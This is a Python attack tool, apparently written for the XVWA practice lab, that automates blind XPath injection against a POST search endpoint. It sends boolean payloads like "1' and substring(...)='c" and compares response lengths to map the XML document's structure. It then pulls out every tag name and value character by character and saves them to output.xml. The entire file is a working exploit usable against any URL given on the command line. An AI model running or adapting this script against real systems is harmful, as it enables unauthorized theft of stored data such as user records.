#!/usr/bin/python3
from pwn import *
import requests, sys, string, time, argparse
from collections import deque

 # Códigos de colores ANSI
NEGRO = '\033[30m'
ROJO = '\033[31m'
VERDE = '\033[32m'
AMARILLO = '\033[33m'
AZUL = '\033[34m'
MAGENTA = '\033[35m'
CIAN = '\033[36m'
BLANCO = '\033[37m'

# Estilos
NEGRITA = '\033[1m'
SUBRAYADO = '\033[4m'

# Fondos
FONDO_NEGRO = '\033[40m'
FONDO_ROJO = '\033[41m'
FONDO_VERDE = '\033[42m'
FONDO_AMARILLO = '\033[43m'
FONDO_AZUL = '\033[44m'
FONDO_MAGENTA = '\033[45m'
FONDO_CIAN = '\033[46m'
FONDO_BLANCO = '\033[47m'

# Restablecer color a los valores predeterminados
RESET = '\033[0m'

# Endpoint vulnerable to XPath Injection
def getARG():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL with the POST endpoint example (http://example.com/xvwa/vulnerabilities/xpath/)")
    parser.add_argument("-d", "--depth", dest="depth", help="Depth of the exploration on the XML")
    opcion = parser.parse_args()
    if not opcion.url:
        parser.error("[-] Specify the url for help use -h")
    if not opcion.depth:
        parser.error("[-] Specify the depth for help use -h")
    return opcion

chars = string.ascii_letters + ' ' + string.digits

class DataTreeNode:
    def __init__(self, value):
        self.length = value  # Corregido a 'length' y usado para almacenar la longitud del nodo
        self.name = ''
        self.data = ''
        self.path = ''
        self.depth = 0
        self.children = []

    def addChild(self, child):
        self.children.append(child)
    
    def addName(self, name):
        self.name = name

    def addData(self, data):
        self.data = data

    def addPath(self, path):
        self.path = path
    
    def addDepth(self, depth):
        self.depth = depth


def extractUsers(node, users):
    if not node.children:
        users.append(node.value)
    for child in node.children:
        extractUsers(child, users)

def getLengthOfTrueResponse():
    post_data = {'search': "1' and '1'='1", 'submit': ''}
    r = requests.post(url, data=post_data)
    return len(r.text)

def exploreNode(MAX_depth):
    number = 1
    true_response_length = getLengthOfTrueResponse()
    root=DataTreeNode("")
    stack=[(root,0)]
    while stack:
        number=1
        current_node, depth = stack.pop()
        if depth < MAX_depth:
            while True:
                payload = f"1' and count(/*{current_node.path})='{number}"
                post_data = {'search': payload, 'submit': ''}
                response = requests.post(url, data=post_data)
                if len(response.text) >= getLengthOfTrueResponse():
                    for i in range(1,number+1):
                        new_node = DataTreeNode(number)
                        current_node.addChild(new_node)
                        actualPath=f'{current_node.path}[{i}]/*'
                        new_node.addPath(actualPath)
                        new_node.addDepth(depth+1)
                        stack.append((new_node,depth+1))
                    break
                number+=1
    return root

def groupNodesByDepth(root):
    if not root:
        return {}

    levelMap = {} 
    queue = deque([(root, 0)])

    while queue:
        node, depth = queue.popleft()
        
        if depth not in levelMap:
            levelMap[depth] = [node]
        else:
            levelMap[depth].append(node)

        for child in node.children:
            queue.append((child, depth + 1))

    return levelMap

def getLength(path):
    number=1
    while True:
        payload = f"1' and string-length(name(/*{path[:-2]}))='{number}"
        post_data = {'search': payload, 'submit': ''}
        response = requests.post(url, data=post_data)
        if len(response.text) >= getLengthOfTrueResponse():
            return number
        number+=1

def getLengthData(name,path):
    number=0
    while True:
        if len(path) >= 6:
            payload = f"1' and string-length(/*{path[:-6]}{name})='{number}"
        else:
            payload = f"1' and string-length({name})='{number}"
        post_data = {'search': payload, 'submit': ''}
        response = requests.post(url, data=post_data)
        if len(response.text) >= getLengthOfTrueResponse():
            return number
        number+=1

def getDataForEachTag(mapita):
    p1 = log.progress("Obtaining Data")
    p1.status("Starting...")
    p2 = log.progress("Data")
    time.sleep(0.2)
    for depth, nodes in mapita.items():
        for node in nodes:
            length=getLengthData(node.name,node.path)
            word=""
            payload = f"1' and string-length({node.name})='0"
            post_data = {'search': payload, 'submit': ''}
            response = requests.post(url, data=post_data)
            if len(response.text) >= getLengthOfTrueResponse():
                length=0
            for i in range(1,length+1):
                for char in chars:
                    if len(node.path) >= 6:
                        payload = f"1' and substring(/*{node.path[:-6]}{node.name},{i},1)='{char}"
                    else:
                        payload = f"1' and substring({node.name},{i},1)='{char}"
                    p1.status(payload)
                    post_data = {'search': payload, 'submit': ''}
                    response = requests.post(url, data=post_data)
                    if len(response.text) >= getLengthOfTrueResponse():
                        word+=char
                        p2.status(word)
            node.addData(word)

def getInfoFromTags(mapita):
    p1 = log.progress("Obtaining Tags")
    p1.status("Starting...")
    p2 = log.progress("Tag")
    time.sleep(0.2)
    for depth, nodes in mapita.items():
        for node in nodes:
            length=getLength(node.path)
            word=""
            for i in range(1,length+1):
                for char in chars:
                    payload = f"1' and substring(name(/*{node.path[:-2]}),{i},1)='{char}"
                    p1.status(payload)
                    post_data = {'search': payload, 'submit': ''}
                    response = requests.post(url, data=post_data)
                    if len(response.text) >= getLengthOfTrueResponse():
                        word+=char
                        p2.status(word)
            node.addName(word)

def print_tree(node,final,indent=""):
    if not node.children:
        final+=f"\n{indent}<{node.name}>{node.data}</{node.name}>"
        print(f"{indent}{ROJO}<{RESET}{BLANCO}{node.name}{RESET}{ROJO}>{RESET}{BLANCO}{node.data}{RESET}{ROJO}</{BLANCO}{node.name}{RESET}{ROJO}>{RESET}")   
    else:
        print(f"{indent}{ROJO}</{RESET}{BLANCO}{node.name}{ROJO}>{BLANCO}{node.data}{RESET}")
        final+=f"\n{indent}<{node.name}>{node.data}"    
    for child in node.children:
        final=print_tree(child,final, indent + "  ")
    if node.children:
        final+=f"\n{indent}</{node.name}>"
        print(f"{indent}{ROJO}</{RESET}{BLANCO}{node.name}{ROJO}>")
    return final

if __name__ == "__main__":
    opciones=getARG()
    url=opciones.url
    depth=opciones.depth
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} XPATH INJECTION {RESET}{MAGENTA}-----{RESET}\n")
    root=exploreNode(int(depth))
    nodesByDepth = groupNodesByDepth(root.children[0])
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} OBTAINING TAGS {RESET}{MAGENTA}-----{RESET}\n")
    getInfoFromTags(nodesByDepth)
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} OBTAINING DATA {RESET}{MAGENTA}-----{RESET}\n")
    getDataForEachTag(nodesByDepth)
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} FINAL DATA {RESET}{MAGENTA}-----{RESET}\n")
    final=print_tree(root.children[0],"")
    with open("output.xml", "w", encoding="utf-8") as file:
        file.write(final)